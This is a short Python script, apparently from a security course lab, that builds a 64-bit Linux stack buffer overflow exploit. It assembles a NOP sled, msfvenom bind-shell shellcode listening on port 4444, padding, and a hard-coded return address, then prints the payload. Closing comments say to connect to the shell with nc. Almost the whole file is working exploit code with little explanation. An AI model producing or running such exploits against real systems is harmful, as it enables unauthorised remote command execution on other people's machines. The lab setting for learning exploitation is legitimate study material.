#!/usr/bin/python

# Following https://samsclass.info/127/proj/p13-64bo.htm
# msfvenom -p linux/x64/shell_bind_tcp -b '\x00' -f python 

nopsled = '\x90' * 100

buf =  ""
buf += "\x48\x31\xc9\x48\x81\xe9\xf5\xff\xff\xff\x48\x8d\x05"
buf += "\xef\xff\xff\xff\x48\xbb\x38\xbf\x4b\xfb\x32\xd9\x3a"
buf += "\xd8\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += "\x52\x96\x13\x62\x58\xdb\x65\xb2\x39\xe1\x44\xfe\x7a"
buf += "\x4e\x68\x1f\x3c\x9b\x49\xfb\x23\x85\x72\x51\xde\xd5"
buf += "\x5b\xa1\x58\xe8\x62\xd7\x3d\xd5\x79\xa3\x3d\xdc\x72"
buf += "\xe9\xce\xd5\x60\xa3\x3d\xdc\x72\x4f\x52\xbc\x15\xb3"
buf += "\xcd\x17\x50\xf9\x60\xb0\x4e\x8e\xc4\xb3\x01\x80\xa1"
buf += "\xf7\xf0\xd4\x50\xb0\x54\xf7\x4b\xd7\x4b\xa8\x7a\x50"
buf += "\xdd\x8a\x6f\xf7\xc2\x1d\x3d\xdc\x3a\xd8"


pad = 'X' * (424 - 100 - len(buf))

# A value in the middle of the NOP sled
# 0x7f ff ff ff df e0
# rip = '\xe0\xdf\xff\xff\xff\x7f\x00\x00'

# 0x00000000ffffdfd0 with gdb
# 0x00000000ffffe020 no gdb
# difference is 50
# dfe0 + 50 = e030

rip = '\x30\xe0\xff\xff\xff\x7f\x00\x00'

print nopsled + buf + pad + rip 

#nc 127.0.0.1 4444
#then type netstat -pant in the shell to see the new process
#on port 4444


